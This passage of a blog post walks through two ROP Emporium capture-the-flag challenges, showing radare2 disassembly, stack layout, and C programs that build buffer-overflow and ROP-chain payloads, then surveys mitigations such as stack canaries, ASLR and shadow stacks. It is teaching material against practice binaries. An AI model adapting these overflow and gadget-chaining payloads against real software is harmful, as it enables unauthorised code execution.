style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x0040081a</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>b8</span><span style=color:#0f0>00000000</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> eax</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> 0</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x0040081f</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>e8ccfd</span><span style=color:red>ffff</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=font-weight:700;color:#0f0>call sym.imp.printf</span><span style=color:red> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;; int printf(const char *format)</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400824</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>bffd09</span><span style=color:#ff0>40</span><span style=color:#0f0>00</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> edi</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> str.bin_cat_flag.txt</span><span style=color:red> ; 0x4009fd ; "/bin/cat flag.txt"</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400829</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>e8b2fd</span><span style=color:red>ffff</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=font-weight:700;color:#0f0>call sym.imp.system</span><span style=color:red> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;; int system(const char *string)</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x0040082e</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>90</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#00f>nop</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x0040082f</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>5d</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=font-weight:700;color:#f0f>pop</span><span style=font-weight:700;color:#0ff> rbp</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>\</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400830</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>c3</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:red>ret</span><span style=color:#b2b2b2></span><br></div></div><p>It is not hard to see that this function fulfills the task.
It executes the command string &ldquo;/bin/cat flag.txt&rdquo; through the function call to <em>system</em>.
All we have to do is call this function.
So then, let&rsquo;s plan the attack!</p><p>We have to understand where the return address is located relative to the stack buffer we can fill with data.
Let us have a look at the start of the function <em>pwnme</em> again, just the first three instructions.</p><div class=term><div style=font-family:monospace,monospace;font-size:9pt;color:#b2b2b2;background-color:#000><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007b5</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>55</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#f0f>push</span><span style=color:#0ff> rbp</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007b6</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>48</span><span style=color:#fff>89e5</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> rbp</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> rsp</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007b9</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>48</span><span style=color:#fff>83ec</span><span style=color:#ff0>20</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>sub</span><span style=color:#0ff> rsp</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> </span><span style=color:#ff0>0x20</span><span style=color:#b2b2b2></span><br></div></div><p><code>push rbp</code> saves the base pointer on the stack.
It is later used by the <code>leave</code> instruction at the end of the function to unwind the stack frame.
<code>sub rsp, 0x20</code> grows the stack downwards by 32 bytes, basically reserving space for our buffer on the stack.
That&rsquo;s all it takes to allocate memory on the stack.
There are no further instructions manipulating the stack until we reach the exploitable call to <em>fgets</em>.
Hence, we end up with the following stack layout.</p><p><code>32 byte buffer + 8 byte rbp + 8 byte return address</code></p><p>That means we need to fill up the buffer with 32 bytes of garbage, write additionally 8 bytes for <code>rbp</code> and then, finally, overwrite the return address with the address of <em>ret2win</em>.
We end up with 48 bytes of input data we have to pipe into the challenge program.
It does not matter how you create the input file.
You could just use a hexeditor and type it in, or write a little program to create the file.
Here&rsquo;s a C program which does that.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdint.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
	FILE <span style=color:#f92672>*</span>fd <span style=color:#f92672>=</span> fopen(<span style=color:#e6db74>&#34;data&#34;</span>, <span style=color:#e6db74>&#34;wb&#34;</span>);

	<span style=color:#75715e>// useless content of the stack buffer, 32 bytes large
</span><span style=color:#75715e></span>	<span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>32</span>; <span style=color:#f92672>++</span>i){
		fputc(<span style=color:#ae81ff>0xAA</span>, fd);
	}
	<span style=color:#75715e>// useless 8 bytes to overwrite rbp
</span><span style=color:#75715e></span>	uint64_t rbp <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xCAFEBABE</span>;
	fwrite(<span style=color:#f92672>&amp;</span>rbp, <span style=color:#66d9ef>sizeof</span>(rbp), <span style=color:#ae81ff>1</span>, fd);
	<span style=color:#75715e>// overwrite return address with address of ret2win()
</span><span style=color:#75715e></span>	uint64_t ret2win <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00400811</span>;
	fwrite(<span style=color:#f92672>&amp;</span>ret2win, <span style=color:#66d9ef>sizeof</span>(ret2win), <span style=color:#ae81ff>1</span>, fd);

	fclose(fd);
	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}</code></pre></div><p>Let&rsquo;s see if it works.</p><pre><code>$ ./ret2win &lt;data
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

&gt; Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)
</code></pre><p>Yep, it does, and it crashes the program.
We corrupted the stack which leads to a segfault.
When the function <em>ret2win</em> finishes execution, it tries to return to its caller with the <code>ret</code> instruction.
As we did not use <code>call</code> to enter the function, there is no valid return address on the stack.
It will interpret whatever is on top of the stack as return address and that&rsquo;s just asking for trouble.
It does not really concern us.
We got our flag and solved the first challenge.</p><h1 id=chaining-gadgets>Chaining Gadgets</h1><p>The first challenge was just a warm-up, teaching you how to redirect control flow by overwriting the return address of a function.
The <a href=https://ropemporium.com/challenge/split.html>second challenge &lsquo;split&rsquo;</a>
teaches us more concepts of return oriented programming, particularly the usage of gadgets and how to chain them together to perform arbitrary operations.</p><p>Let us start by analysing the executable file we got.
First, we extract the list of functions residing in the binary.</p><div class=term><div style=font-family:monospace,monospace;font-size:9pt;color:#b2b2b2;background-color:#000><span style=color:#ff0>[0x00400650]&gt;</span><span style=color:#b2b2b2> is~FUNC~LOCAL</span><br>030 0x00000680 0x00400680 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;&#160;0 deregister_tm_clones<br>031 0x000006c0 0x004006c0 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;&#160;0 register_tm_clones<br>032 0x00000700 0x00400700 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;&#160;0 __do_global_dtors_aux<br>035 0x00000720 0x00400720 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;&#160;0 frame_dummy<br>038 0x000007b5 0x004007b5 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;82 pwnme<br>039 0x00000807 0x00400807 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;17 usefulFunction<br></div></div><p>The function <em>pwnme</em> sounds familiar.
If you check out the disassembly, you will notice that it is pretty much unchanged.
The size parameter to <em>fgets</em> is larger which allows us to write more data to the stack.
That will make our life easier.</p><p>The second interesting function is suspiciously named <em>usefulFunction</em>.
What is so useful about it?</p><div class=term><div style=font-family:monospace,monospace;font-size:9pt;color:#b2b2b2;background-color:#000><span style=color:#ff0>[0x00400807]&gt;</span><span style=color:#b2b2b2> pdf</span><br><span style=color:#0ff>/</span><span style=color:#b2b2b2> </span><span style=color:red>(fcn) sym.usefulFunction</span><span style=color:#b2b2b2> 17</span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> &#160;&#160;</span><span style=color:red>sym.usefulFunction</span><span style=color:#b2b2b2> ();</span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400807</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>55</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#f0f>push</span><span style=color:#0ff> rbp</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400808</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>48</span><span style=color:#fff>89e5</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> rbp</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> rsp</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x0040080b</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>bf</span><span style=color:red>ff</span><span style=color:#fff>08</span><span style=color:#ff0>40</span><span style=color:#0f0>00</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> edi</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> str.bin_ls</span><span style=color:red> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;; 0x4008ff ; "/bin/ls"</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400810</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>e8cbfd</span><span style=color:red>ffff</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=font-weight:700;color:#0f0>call sym.imp.system</span><span style=color:red> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;; int system(const char *string)</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400815</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>90</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#00f>nop</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400816</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>5d</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=font-weight:700;color:#f0f>pop</span><span style=font-weight:700;color:#0ff> rbp</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>\</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400817</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>c3</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:red>ret</span><span style=color:#b2b2b2></span><br></div></div><p>Mhmm, there is this call to <em>system</em> again&hellip;
But this time it is just executing &ldquo;/bin/ls&rdquo;.
Too bad. Could have been so easy.</p><p>Well, let&rsquo;s dig a little deeper.
<em>system</em> takes a string as the only parameter.
What are the strings stored in the executable?
The command <code>iz</code> searches for all strings in the data section where constants like string literals are usually stored.</p><div class=term><div style=font-family:monospace,monospace;font-size:9pt;color:#b2b2b2;background-color:#000><span style=color:#ff0>[0x00400807]&gt;</span><span style=color:#b2b2b2> iz</span><br>[Strings]<br>Num Paddr &#160;&#160;&#160;&#160;&#160;Vaddr &#160;&#160;&#160;&#160;&#160;Len Size Section &#160;Type &#160;String<br>000 0x000008a8 0x004008a8 &#160;21 &#160;22 (.rodata) ascii split by ROP Emporium<br>001 0x000008be 0x004008be &#160;&#160;7 &#160;&#160;8 (.rodata) ascii 64bits\n<br>002 0x000008c6 0x004008c6 &#160;&#160;8 &#160;&#160;9 (.rodata) ascii \nExiting<br>003 0x000008d0 0x004008d0 &#160;43 &#160;44 (.rodata) ascii Contriving a reason to ask user for data...<br>004 0x000008ff 0x004008ff &#160;&#160;7 &#160;&#160;8 (.rodata) ascii /bin/ls<br>000 0x00001060 0x00601060 &#160;17 &#160;18 (.data) ascii /bin/cat flag.txt</div></div><p>Talk about lucky!
Our favorite string &ldquo;/bin/cat flag.txt&rdquo; is still in the executable.
We could have found it as well by studying the symbol table more carefully (<code>is~useful</code>).
Now we need to call <em>system</em> with this string as function parameter, but there is no such control flow anywhere in the whole executable.
We have to create one by abusing the code which is available.
This is what return oriented programming is all about.</p><p>More than 15 years ago life for an attacker was easy.
We could write our own code we like to execute at the beginning of the stack buffer and overwrite the return address with the address of the start of the buffer to redirect control flow there.
Boom! Arbitrary code execution.</p><p>That is not possible anymore.
Since then the memory protection policy &ldquo;W ^ X&rdquo; got introduced in every major general-purpose operating system.
A memory page can be writable or executable, but not both.
The policy is not strictly followed everywhere but for the stack it is.
The stack memory is obviously writable to store local variables and return addresses, but it does not need to be executable as it just contains data.
We can check with <code>i~nx</code> if the stack is non-executable.
On a modern linux system it should be.</p><p>The memory page containing the program instructions is executable but not writable, which prevents us from manipulating the program code.
We can still redirect control flow anywhere we want and therefore execute any code in the program and its library dependencies.
If we jump just a few instructions before a <code>ret</code> instruction, just these few instructions will be executed before we can jump elsewhere with <code>ret</code> reading the next address from the stack we control.
That is called a ROP gadget.
Combining multiple gadgets is called a ROP chain.</p><p>We need to replace the first parameter to a function call.
The first parameter is passed in the register <code>rdi</code> according to the calling convention.
We must load the address of the string &ldquo;/bin/cat flag.txt&rdquo; <code>0x00601060</code> into this register, so that <em>system</em> will use it instead of &ldquo;/bin/ls&rdquo;.
We control the stack memory.
So, let&rsquo;s write the address on the stack and use the <code>pop</code> instruction to get it into the register <code>rdi</code>.
We can search for ROP gadgets with the <code>/R</code> command.</p><div class=term><div style=font-family:monospace,monospace;font-size:9pt;color:#b2b2b2;background-color:#000><span style=color:#ff0>[0x00400807]&gt;</span><span style=color:#b2b2b2> /R pop rdi</span><br>&#160;0x00400883 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;5f<span style=font-weight:700;color:#f0f> &#160;pop</span><span style=font-weight:700;color:#0ff> rdi</span><span style=color:#b2b2b2></span><br>&#160;0x00400884 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;c3<span style=color:red> &#160;ret</span><span style=color:#b2b2b2></span><br></div></div><p>That is exactly what we were looking for.
Let&rsquo;s put it all together.</p><p><em>pwnme</em> still has the same vulnerability.
We fill up the stack buffer with 32 bytes of garbage, followed by 8 bytes for the stored <code>rbp</code> register.
Next, we overwrite the return address with the address to the ROP gadget at <code>0x00400883</code>.
The gadget reads 8 bytes from the stack with <code>pop rdi</code> which means we write the address <code>0x00601060</code> of the string &ldquo;/bin/cat flag.txt&rdquo; next.
The second instruction in the gadget is a <code>ret</code> instruction, so we can write the next address to jump to on the stack.
We can jump into <em>usefulFunction</em> at <code>0x00400810</code> where the call instruction to <em>system</em> is located.
Alternatively, we can jump directly to <em>system</em> by getting its address with <code>is~system</code>.</p><p>ROP is all about sequencing precise jumps to execute a few instructions and jump on.
Kind of bunny hopping all over the executable code of a program.
With enough executable code available it is turing complete, i.e., any possible calculation can be performed.
The C standard library &ldquo;libc&rdquo; is big enough and used by a lot of central components of most operating systems.</p><p>Here&rsquo;s a C program creating the input file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdint.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
	FILE <span style=color:#f92672>*</span>fd <span style=color:#f92672>=</span> fopen(<span style=color:#e6db74>&#34;data&#34;</span>, <span style=color:#e6db74>&#34;wb&#34;</span>);

	<span style=color:#75715e>// useless content of the stack buffer, 32 bytes large
</span><span style=color:#75715e></span>	<span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>32</span>; <span style=color:#f92672>++</span>i){
		fputc(<span style=color:#ae81ff>0xAA</span>, fd);
	}
	<span style=color:#75715e>// useless 8 bytes to overwrite rbp
</span><span style=color:#75715e></span>	uint64_t rbp <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xCAFEBABE</span>;
	fwrite(<span style=color:#f92672>&amp;</span>rbp, <span style=color:#66d9ef>sizeof</span>(rbp), <span style=color:#ae81ff>1</span>, fd);

	<span style=color:#75715e>// gadget: pop rdi; ret
</span><span style=color:#75715e></span>	uint64_t poprdi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00400883</span>;
	fwrite(<span style=color:#f92672>&amp;</span>poprdi, <span style=color:#66d9ef>sizeof</span>(poprdi), <span style=color:#ae81ff>1</span>, fd);

	<span style=color:#75715e>// string &#34;/bin/cat flag.txt&#34;
</span><span style=color:#75715e></span>	uint64_t flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00601060</span>;
	fwrite(<span style=color:#f92672>&amp;</span>flag, <span style=color:#66d9ef>sizeof</span>(flag), <span style=color:#ae81ff>1</span>, fd);
	<span style=color:#75715e>// call system
</span><span style=color:#75715e></span>	uint64_t system <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00400810</span>;
	fwrite(<span style=color:#f92672>&amp;</span>system, <span style=color:#66d9ef>sizeof</span>(system), <span style=color:#ae81ff>1</span>, fd);

	fclose(fd);
	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}</code></pre></div><pre><code>$ ./split &lt;data
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
&gt; ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)
</code></pre><p>With the second challenge beaten you can check out the other challenges.
I had a lot of fun piecing the puzzles together and it teached me a lot about the execution flow of a program, especially how function calls into a shared library really work.
I encourage you to have a look.</p><h1 id=rop-mitigations>ROP Mitigations</h1><p>Now that we understand the basic concept behind ROP, let us briefly look at some mitigation techniques which try to harden software against exploitation with ROP.</p><p>A general technique to detect stack buffer overflows and prevent overwriting of return addresses is called stack canaries.
A canary value chosen randomly at program start gets written right on top of return address of a function.
Before the function returns, the canary value is checked to be unchanged.
An attacker trying to overwrite the return address has to overwrite the canary value as well, with the same value which was there before.
Most compilers support somekind of stack protection like this.
The compilation flag in GCC is <code>-fstack-protector</code> to protect only &ldquo;larger&rdquo; functions which limits the negative performance impact, or <code>-fstack-protector-all</code> to protect all functions.
The ROP Emporium challenges have it disabled (<code>i~canary</code>).</p><p>Another widespread technique is address space layout randomization (ASLR).
The address where each component of a program (executable code and library dependencies) is mapped into the virtual address space of the process is randomly chosen at the program start.
Hence, the attacker does not know the address of a ROP gadget anymore as it changes with each program start.
Program code must be compiled as position-independent code (PIC) to support this randomization.
It was not done for the challenges (<code>i~pic</code>).</p><p><a href=https://software.intel.com/sites/default/files/managed/4d/2a/control-flow-enforcement-technology-preview.pdf>Intel CET</a>
changes how the <code>call</code> and <code>ret</code> instruction work.
It creates a shadow stack for return addresses.
<code>call</code> pushes to both stacks, normal and shadow, and <code>ret</code> pops from both and does a comparison before jumping.
The other feature of CET is Indirect Branch Tracking which enforces that every legal target of an indirect call/jump starts with an <code>endbranch</code> instruction.
This should limit the number of useful gadgets.</p><p>It requires compiler support which landed in GCC 8.
And even more importantly, CPUs supporting this feature.
I am not aware of any CPU being sold today that support it.
Something to keep in mind for the future, I guess.
In the meantime, one might try Clang&rsquo;s <a href=https://clang.llvm.org/docs/SafeStack.html>SafeStack</a> which implements a shadow stack as well but works on today&rsquo;s CPUs.</p><h1 id=conclusion>Conclusion</h1><p>I hope you found this post informative and have now a better understanding why certain security mitigations exist and work the way they do.
Yes, they have a negative impact on your program performance, but they are essential to make the life hard for an attacker.
So, next time you handle input data coming from some untrusted source be extra careful to check the buffer size correctly.
You know now what otherwise can happen.</p><p>Hopefully you also had a little fun playing attacker for once.
I for sure had, but according to my colleagues I might be &ldquo;special&rdquo; in that regard.
There has to be something wrong with people looking at (dis)assembly.
Who knows&hellip;</p><p>I think one can only grow as a programmer when one occasionally lifts the lid and has a look how things are really implemented.
Curiosity is part of my job description as a researcher and leads to deeper understanding which I am happy to share with you.
Until next time.</p></article><div class=pagination><a href=https://tetzank.github.io/posts/x-macros/ class="left arrow">&#8592; previous</a>
<a href=# class=top>Top</a></div></main></div></body></html>